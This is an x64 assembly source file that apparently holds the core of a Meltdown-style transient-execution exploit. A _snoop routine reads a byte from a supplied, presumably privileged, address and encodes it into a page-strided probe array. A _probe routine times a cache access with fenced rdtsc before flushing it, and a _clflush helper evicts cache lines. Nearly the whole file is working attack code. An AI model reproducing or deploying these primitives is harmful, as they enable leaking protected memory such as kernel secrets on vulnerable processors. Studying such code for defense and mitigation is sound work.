.code

_snoop PROC PUBLIC
retry:
	xor rax, rax
	;mov rsi, qword ptr[eax]
	mov al, byte ptr [rcx]
	shl rax, 12
	jz retry
	mov rdx, qword ptr [rdx + rax]
	ret

_snoop ENDP


_probe PROC PUBLIC
	mfence
	lfence
	rdtsc
	lfence
	mov rsi, rax
	mov rax, qword ptr [rcx]
	lfence
	rdtsc
	sub rax, rsi
	clflush [rcx]
	ret

_probe ENDP

_clflush PROC PUBLIC
	mfence
	lfence
	clflush [rcx]
	ret

_clflush ENDP

END
